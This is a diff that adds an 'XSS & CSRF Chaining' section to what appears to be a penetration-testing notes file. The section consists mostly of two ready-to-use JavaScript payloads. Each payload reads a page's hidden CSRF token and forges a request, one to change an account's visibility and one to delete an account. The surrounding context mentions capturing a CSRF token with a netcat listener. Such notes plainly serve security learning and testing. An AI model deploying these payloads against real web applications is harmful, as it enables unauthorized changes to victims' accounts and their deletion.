@@ -185,6 +185,42 @@ and then use a similar payload:
 ```
 If the user visits the crafted URL, we can catch the CSRF token with our netcat listener.
 
+## XSS & CSRF Chaining
+A request through XSS will bypass any same origin/same site protection since it will derive from the same domain.
+What we can do is to save a payload on the domain to a publicly accessible endpoint and then make the user click on a specifically crafted URL while he/she is logged in.
+The payload can be a similar javascript code:
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+</script>
+```
+or
+```
+``<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/delete', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token);
+};
+</script>
+```
+
 
 
 
